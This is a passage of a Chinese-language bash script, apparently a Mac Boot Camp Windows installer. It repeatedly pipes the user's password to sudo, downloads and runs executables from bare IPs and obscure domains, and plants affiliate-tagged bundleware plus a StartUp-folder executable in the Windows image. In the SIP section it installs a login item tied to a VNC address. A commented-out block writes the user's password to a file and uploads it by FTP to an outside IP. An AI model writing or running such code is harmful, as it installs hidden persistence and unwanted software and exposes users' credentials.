rm -rf /Volumes/EFI/EFI/APPLE/CACHES
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
if [[ $modelxh = "10.11"* ]]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
echo
echo "当前安装模式EFI"
echo
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
else
if [ "$Winclone555" ]; then
echo
#echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -l -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
echo
echo "当前安装模式MBR"
echo
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
fi
fi


if [[ $modelxh = "10.11"* ]]; then
Winclone555="1"
fi

if [[ $modelxh = "12."* ]]; then
Winclone555="1"
fi



mv /tmp/boot.img.gz ~/Downloads/JG_Download/"$xtname3"

if [ "$Winclone555" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666 
bootcamp_mounted="/tmp/666"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone -m ${restore_device})
fi


cp -R ~/Downloads/WindowsSupport "${bootcamp_mounted}"
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}"

if [ "$soft" ]; then
if [ -f /tmp/7x64.exe ]; then
rm -rf "${bootcamp_mounted}/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/ie.bat"
cp "/tmp/7x64.exe" "${bootcamp_mounted}/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
cp "/tmp/764.exe" "${bootcamp_mounted}/MBox/soft"
fi
fi



/tmp/aria2c -c -o bt.exe $ip5/bt.exe -d /tmp
/tmp/aria2c -c -o 7b.exe $ip5/7b.exe -d /tmp
#/tmp/aria2c -c -o 7b2.exe $ip5/7b2.exe -d /tmp



mv "${bootcamp_mounted}/DrvCeo.exe" "${bootcamp_mounted}/MBox/soft/Drv.exe"
cp -R "/tmp/Windows" "${bootcamp_mounted}"
cp -R "/tmp/Mbox" "${bootcamp_mounted}"
cp -R "/tmp/Loader" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/Windows Loader.exe" "${bootcamp_mounted}/Windows/Windows Loader"
cp "/tmp/DrvCeo.exe" "${bootcamp_mounted}"
cp "/tmp/bt.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/7b.exe" "${bootcamp_mounted}/Windows"
cp "/tmp/7b2.exe" "${bootcamp_mounted}/Windows"
cp "/tmp/QQBrowser_subid@202014_urlid@202014.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/360se+266372+n2ff5167499.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/TeamViewerQS.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/ToDesk.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/qqpcmgr_202014.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/wpssetup_k3464024_206128.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/MarketSetup_266372.exe" "${bootcamp_mounted}/MBox/soft"
cp "/tmp/360zip_yqlm_266372.exe" "${bootcamp_mounted}/MBox/soft"


if [ "$xianka" ]; then
rm -rf "${bootcamp_mounted}/WindowsSupport/BootCamp/Drivers/Intel/IntelHDGraphicsSetup.exe"
rm -rf "${bootcamp_mounted}/WindowsSupport/BootCamp/Drivers/Intel/IntelHDGraphicsSetup64.exe"
rm -rf "${bootcamp_mounted}/WindowsSupport/BootCamp/Drivers/Intel/IntelHDLegacyGraphics64.exe"
rm -rf "${bootcamp_mounted}/WindowsSupport/$WinPEDriver$/IntelHDGraphics64"
fi


if [ "$EFIWIN7" ]; then
echo "$pass" | sudo -S sudo diskutil mount disk0s1
cp -R /tmp/EFI /Volumes/EFI
diskutil unmount disk0s1
fi


#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt


clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences" >/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi



if [ "$kzdcq" ]; then
if [ ! "$sip" ]; then
echo "$pass" | sudo -S sudo bless -mount /Volumes/BootCamp -setBoot -legacy -file /Volumes/BootCamp/bootmgr
clear && printf "\e[3J"
echo
echo
echo "\033[36m安装完成，倒计时30秒开始！结束后将自动进入Windows系统！\033[0m"
echo
echo
t=30
while test $t -gt 0
do
echo "${t}\b\b\c"
sleep 1
t=$((t-1))
done
echo "$pass" | sudo -S sudo shutdown -r now
exit
fi
fi

if [[ $modelxh != "10.5"* ]]; then
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
fi
fi


open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
fi


if [ -f ~/Downloads/JG_Download/New10.dmg ]; then
clear && printf "\e[3J"
echo
SourceMD5="caa02c05e8534a46fc256498b8db26ef"
if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/New10.dmg)
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		read -s -n1 -p "请按任意键返回，重新下载 ... "
		Start_menu
	fi
	fi
	


if [ ! -f /tmp/DrvCeo.exe ]; then
/tmp/aria2c -c -o DrvCeo.exe  http://wxdnzy.top/ip8/DrvCeo.exe -d /tmp
if [ -f /tmp/DrvCeo.exe.aria2 ]; then
/tmp/aria2c -c -o DrvCeo.exe  http://wxdnzy.top/ip8/DrvCeo.exe -d /tmp
if [ ! -f /tmp/DrvCeo.exe.aria2 ]; then
/tmp/aria2c -c -o DrvCeo.exe  http://wxdnzy.top/ip8/DrvCeo.exe -d /tmp
fi
fi
fi

if [ ! -f /tmp/DrvCeo.exe ]; then
read -s -n1 -p "部署文件无法下载，按任意键重试 ... "
Winxt
fi


/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe http://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
/tmp/aria2c -c -o TeamViewerQS.exe http://tv-static-net.oss-cn-beijing.aliyuncs.com/download/tv15/TeamViewerQS.exe -d /tmp
/tmp/aria2c -c -o ToDesk.exe http://dl.todesk.com/windows/ToDesk_Lite.exe -d /tmp
/tmp/aria2c -c -o qqpcmgr_202014.exe https://cdn.zjbl.qq.com/app/qqpcmgr_v15.0.22122.210_s1241.exe -d /tmp
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe http://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp
/tmp/aria2c -c -o MarketSetup_266372.exe http://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
/tmp/aria2c -c -o 360zip_yqlm_266372.exe http://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp


if [ ! -f /tmp/360se+266372+n2ff5167499.exe ]; then
/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe http://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
fi

if [ ! -f /tmp/TeamViewerQS.exe ]; then
/tmp/aria2c -c -o TeamViewerQS.exe http://tv-static-net.oss-cn-beijing.aliyuncs.com/download/tv15/TeamViewerQS.exe -d /tmp
fi

if [ ! -f /tmp/ToDesk.exe ]; then
/tmp/aria2c -c -o ToDesk.exe http://dl.todesk.com/windows/ToDesk_Lite.exe -d /tmp
fi

if [ ! -f /tmp/qqpcmgr_202014.exe ]; then
/tmp/aria2c -c -o qqpcmgr_202014.exe http://down.bfxitong.com/sqsoft/qqpcmgr_129017.exe -d /tmp
fi

if [ ! -f /tmp/wpssetup_k3464024_206128.exe ]; then
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe http://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp
fi

if [ ! -f /tmp/MarketSetup_266372.exe ]; then
/tmp/aria2c -c -o MarketSetup_266372.exe http://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
fi

if [ ! -f /tmp/360zip_yqlm_266372.exe ]; then
/tmp/aria2c -c -o 360zip_yqlm_266372.exe http://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp
fi



mv ~/Downloads/JG_Download/New10.dmg /tmp/boot.img.gz



echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}




if [ $? -ne 0 ] ; then
mv /tmp/boot.img.gz ~/Downloads/JG_Download/New10.dmg
clear && printf "\e[3J"
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi


mv /tmp/boot.img.gz ~/Downloads/JG_Download/New10.dmg



rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
cp ~/Downloads/BootCamp/WindowsSupport.dmg /tmp/666
cp ~/Downloads/JG_Download/BootCamp.zip /tmp/666
mkdir -p /tmp/666/MBox/soft
mv "/tmp/666/DrvCeo.exe" /tmp/666/MBox/soft/Drv.exe
cp "/tmp/DrvCeo.exe" /tmp/666
cp "/tmp/360se+266372+n2ff5167499.exe" /tmp/666/MBox/soft
cp "/tmp/TeamViewerQS.exe" /tmp/666/MBox/soft
cp "/tmp/ToDesk.exe" /tmp/666/MBox/soft
cp "/tmp/qqpcmgr_202014.exe" /tmp/666/MBox/soft
cp "/tmp/wpssetup_k3464024_206128.exe" /tmp/666/MBox/soft
cp "/tmp/MarketSetup_266372.exe" /tmp/666/MBox/soft
cp "/tmp/360zip_yqlm_266372.exe" /tmp/666/MBox/soft




clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences"
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0


fi


if [ -f ~/Downloads/JG_Download/1809.esd ]; then

if [ ! -f /tmp/Drv.zip ]; then
/tmp/aria2c -c -o Drv.zip  http://39.108.9.186/dos/mac/1809.zip -d /tmp
if [ -f /tmp/Drv.zip.aria2 ]; then
/tmp/aria2c -c -o Drv.zip  http://39.108.9.186/dos/mac/1809.zip -d /tmp
if [ ! -f /tmp/Drv.zip.aria2 ]; then
/tmp/aria2c -c -o Drv.zip  http://39.108.9.186/dos/mac/1809.zip -d /tmp
fi
fi
fi

if [ ! -f /tmp/Drv.zip ]; then
read -s -n1 -p "部署文件无法下载，按任意键重试 ... "
Winxt
fi

if [ "$soft" ]; then
#/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
/tmp/aria2c -c -o QQBrowser_subid@202014_urlid@202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/QQBrowser_Setup_9.2.5170.402_9.2.exe -d /tmp
/tmp/aria2c -c -o qqpcmgr_202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/qqpcmgr_v15.0.22122.210_s1241.exe -d /tmp
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe --console-log-level=warn --summary-interval=888888888 https://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp
#/tmp/aria2c -c -o MarketSetup_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
#/tmp/aria2c -c -o 360zip_yqlm_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp
fi

clear && printf "\e[3J"
echo

SourceMD5="a64f2bf8299bb20221ccfb2652b33144"
if [ ! -f ~/Downloads/JG_Download/"$SourceMD5" ]; then
	echo
	echo "正在校验文件中..."
	TargetMD5=$(md5 ~/Downloads/JG_Download/1809.esd)
	TargetMD5=${TargetMD5##* }
	if [ "$TargetMD5" = "$SourceMD5" ]
	then
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：正确"
		echo "$TargetMD5" > ~/Downloads/JG_Download/"$TargetMD5"
	else
		clear
		echo
		echo "源文件MD5 = $SourceMD5"
		echo
		echo "目标文件MD5 = $TargetMD5"
		echo
		echo "MD5校验结果：错误"
		echo
		read -s -n1 -p "请按任意键返回，重新下载 ... "
		Start_menu
	fi
	fi
	
mv ~/Downloads/JG_Download/1809.esd /tmp/Windows.wim


if [ "$sip" ]; then
if [[ $modelbb = *"MacBookPro8,3"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1011pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro8,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1011pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro8,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1011pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro9,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro9,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1013pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookPro10,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1013pro.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,1"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"MacBookAir5,2"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/bt.exe" "$ip4/dos/mac/w1012air.exe">/dev/null 2>&1
else
if [[ $modelbb = *"Parallels14,1"* ]]; then
echo
else

echo
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [[ $modelbb = *"MacBookPro6,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro6,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro7,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro8,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro8,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro8,3"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro9,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro9,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro10,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookPro10,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookAir5,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookAir5,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookAir4,1"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"MacBookAir4,2"* ]]; then
MBR10="1"
else
if [[ $modelbb = *"Parallels14,1"* ]]; then
MBR10="1"
else

echo
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi

if [[ $modelxh = "10.10"* ]]; then
Winclone666="1"
fi

if [ "$Winclone666" ]; then
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -l -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device}
fi
else
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -l -p ${restore_device} -i 1
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i 1
fi
fi

if [ $? -ne 0 ] ; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/1809.esd
echo "$pass" | sudo -S sudo diskutil mount disk0s1
rm -rf /Volumes/EFI/EFI/APPLE/CACHES
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
if [ "$Winclone666" ]; then
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone6 -l -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone6  -e -p ${restore_device}
fi
else
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone -l -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
echo "$pass" | sudo -S sudo diskutil mount disk0s1
open /Volumes/EFI
echo "安装失败！！！${restore_device}.请检查EFI分区情况"
echo
read -s -n1 -p "按任意键继续修复引导 ... "
if [ "$Winclone666" ]; then
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone6 -l -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone6  -e -p ${restore_device}
fi
else
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone -l -p ${restore_device}
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
fi
fi


mv /tmp/Windows.wim ~/Downloads/JG_Download/1809.esd



if [[ $modelxh = "12."* ]]; then
Winclone666="1"
fi

if [ "$Winclone666" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666 
bootcamp_mounted="/tmp/666"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone -m ${restore_device})
fi

cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}"
unzip -o "/tmp/Drv.zip" -d "/tmp">/dev/null 2>&1
cp -R "/tmp/Windows" "${bootcamp_mounted}"
cp "/tmp/bt.exe" "${bootcamp_mounted}/MBox/soft/bt2.exe"
cp "/tmp/QQBrowser_subid@202014_urlid@202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360se+266372+n2ff5167499.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/qqpcmgr_202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/wpssetup_k3464024_206128.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/MarketSetup_266372.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360zip_yqlm_266372.exe" "${bootcamp_mounted}/Mbox/soft"


clear && printf "\e[3J"
echo 
echo 
echo 
echo "安装完成！！！${restore_device}."
echo 
echo 
echo 
echo

fi


clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
}


Downloadzxc(){
	
	
	
	if [ "$scwj" ]; then
	echo "$pass" | sudo -S sudo rm -rf ~/Downloads/JG_Download >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf ~/Downloads/BootCamp >/dev/null 2>&1
	mkdir -p ~/Downloads/JG_Download >/dev/null 2>&1
	scwj=""
	fi
	
	
	
	clear && printf "\e[3J"
	
	if [ "$gbsip" ] ; then
	diskutil eraseVolume JHFS+ SIPFQ "$restore_device"
	curl -# -C - --connect-timeout 10 -o /tmp/gbsip.zip "$ip5/gbsip.zip"
    unzip -o "/tmp/gbsip.zip" -d "/Volumes/SIPFQ">/dev/null 2>&1
	echo gbsip > ~/Downloads/JG_Download/SIPFQ
	#echo "#!/bin/sh">/Applications/7777.sh
	#echo hdiutil attach $HOME/Downloads/JG_Download/7777.dmg>>/Applications/7777.sh
	#echo /Volumes/JGDow/→→→→→→右击打开我←←←←←←←>>/Applications/7777.sh
	#chmod a+x /Applications/7777.sh
	#if [ -f ~/Downloads/7777.dmg ]; then
    #cp -R ~/Downloads/7777.dmg ~/Downloads/JG_Download/7777.dmg
    #else
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/7777.dmg "$osip/7777.dmg"
    #fi
    curl -# -C - --connect-timeout 10 -o ~/7777.dmg "$osip/7777.dmg"
	curl -# -C - --connect-timeout 10 -o "/tmp/cxdk7777.zip" "$osip/cxdk77771.zip"
    unzip -o "/tmp/cxdk7777.zip" -d "/Applications">/dev/null 2>&1
    #echo "#!/bin/sh" > /Applications/7777
    #echo bjsbm="$bjsbm" >> /Applications/7777
    #echo vncip="$vncip" >> /Applications/7777
    #echo hdiutil attach $HOME/Downloads/JG_Download/7777.dmg >> /Applications/7777
	#echo /Volumes/JGDow/→→→→→→右击打开我←←←←←←← >> /Applications/7777
	echo bjsbm="$bjsbm" > ~/7777.sh
    echo vncip="$vncip" >> ~/7777.sh
    osascript -e 'tell application "System Events" to make login item with properties {path:"/Applications/7777", hidden:false}'
	clear && printf "\e[3J"
	echo
	echo
	echo
	osascript -e 'tell application "System Events" to display dialog "SIP操作已完成，请通知技术员！" buttons {"OK"}'
	echo
	echo
	echo
	exit
	fi
	
	
	
	numcs=""
	if [[ $modelxh = "10.13"* ]]; then
	gbbbt="1"
	fi	
	if [[ $modelxh = "10.14"* ]]; then
	gbbbt="1"
	fi	
	if [[ $modelxh = "10.15"* ]]; then
	zip="1"
	gbbbt="1"
	fi
	if [[ $modelxh = "11."* ]]; then
	zip="1"
	gbbbt="1"
	fi	
	if [[ $modelxh = "12."* ]]; then
	zip="1"
	gbbbt="1"
	fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "pmset -a displaysleep 0 disksleep 0 sleep 0" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo pmset -a displaysleep 0 disksleep 0 sleep 0
fi
	
	if [ ! "$MAC106" ] ; then	
	if [[ $modelxh = "11110.6"* ]]; then
	
	if [ ! -e /Applications/Maxthon.app ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/m.dmg "http://dl.maxthon.cn/mac/Maxthon-4.1.3.5000.dmg"
	hdiutil attach /tmp/m.dmg
	cp -R /Volumes/Maxthon/Maxthon.app /Applications
	fi
	
	if [ "$name2" ] ; then	
	if [ ! -f ~/Downloads/JG_Download/"$name2" ]; then
	open -a "/Applications/Maxthon.app" "$url2"
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "等待浏览器下载完成后，回车继续..."
	fi
	fi
	
	if [ "$name" ] ; then	
	if [ ! -f ~/Downloads/JG_Download/"$name" ]; then
	open -a "/Applications/Maxthon.app" "$url"
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "等待浏览器下载完成后，回车继续..."
	fi
	fi
	
	if [ -f ~/Downloads/7x64_104.* ]; then
    mv ~/Downloads/7x64_104.* ~/Downloads/JG_Download/7x64.dmg
    fi
    
	if [ -f ~/Downloads/1809_104.* ]; then
    mv ~/Downloads/1809_104.* ~/Downloads/JG_Download/1809_HDD.dmg
    fi
    
    if [ -f ~/Downloads/1909_104.* ]; then
    mv ~/Downloads/1909_104.* ~/Downloads/JG_Download/1909_HDD.dmg
    fi
    
    if [ -f ~/Downloads/Win11_104.* ]; then
    mv ~/Downloads/Win11_104.* ~/Downloads/JG_Download/Win11_HDD.dmg
    fi
    
    if [ "$name" ] ; then	
	if [ -f ~/Downloads/JG_Download/"$name" ]; then
	FenQu3
	else
    read -t 2 -p "未检测到下载文件，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
    Downloadzxc	
	fi
	fi
	
    if [ "$name2" ] ; then	
	if [ -f ~/Downloads/JG_Download/"$name2" ]; then
	FenQu3
	else
    read -t 2 -p "未检测到下载文件，将自动重试下载...如果一直重复，请通知技术员" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
    Downloadzxc	
	fi
	fi
	
	fi
	
	fi
	
	if [ ! "$DrvWZ" ]; then
	if [ ! "$tarbc" ]; then
	if [ ! -f "/tmp/bootcamp.txt" ]; then
	if [ ! "$url2" ]; then
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ ! -f ~/Downloads/JG_Download/BootCamp.zip ]; then
	if [ ! -f ~/Downloads/JG_Download/BootCampESD.pkg.aria2 ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/bootcamp.zip $ip5/bootcamp.zip>/dev/null 2>&1
	unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/bootcamp.zip" -d "/tmp">/dev/null 2>&1
	rm -f "/tmp/bootcamp.zip" 
	chmod a+x /tmp/bootcamp
	chmod a+x /tmp/bootcamp2
	
	if [ "$gbbbt" ]; then
	/tmp/bootcamp
	sleep 3s
	if [ ! -f "/tmp/bootcamp.txt" ]; then
	/tmp/bootcamp2
	sleep 3s	
    fi
	else
	/tmp/bootcamp2
	sleep 3s
    fi
	
	if [ ! -f "/tmp/bootcamp.txt" ]; then
	clear && printf "\e[3J"
	echo
	echo
	read -t 10 -p "未能获取到云端BootCamp，10秒后采用其他方案自动继续..."
	name2="$name"
    url2="$url"
    tarbc="1"
    if [ "$ipbc" ]; then
    tarbc=""
    DowBootCampIP
    else
    DowBootCamp
    fi
	fi
	fi
	fi
	fi
    fi
    fi
    fi
    
        
    if [ ! -f ~/Downloads/JG_Download/BootCamp.zip ]; then
    if [ ! "$url2" ]; then
    if [ "$tarbc" ]; then
    if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
    name2="$name"
    url2="$url"
    if [ "$ipbc" ]; then
    DowBootCampIP
    else
    DowBootCamp
    fi
    fi
    fi
    fi
    fi
    
    if [ ! "$url2" ]; then
    if [ -f ~/Downloads/JG_Download/BootCamp.zip.aria2 ]; then
    name2="$name"
    url2="$url"
    if [ "$ipbc" ]; then
    DowBootCampIP
    else
    DowBootCamp
    fi
    fi
    if [ -f ~/Downloads/JG_Download/BootCampESD.pkg.aria2 ]; then
    name2="$name"
    url2="$url"
    if [ "$ipbc" ]; then
    DowBootCampIP
    else
    DowBootCamp
    fi
    fi
    fi
    
    fi

    
    
    if [ "$tarbc" ]; then
    if [ "$cxxz" ]; then
    if [ -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
    name=""
    url=""
    fi
    fi
    fi
  
    if [ "$name" = "BootCampESD.pkg" ]; then    
    if [ -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
    if [ "$name2" ]; then    
    name=""
    url=""
    name="$name2"
    url="$url2"   
    name2=""
    url2=""
    fi
    fi
    fi 
    
if [ -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
rm -rf "/tmp/bootcamp.txt"
fi

	name="${name##*/}"
	unzip_name="${name%.*}"
	
	if [ ! -f "/tmp/aria2c" ]; then
	
	if [[ $modelxh = "10.9"* ]]; then
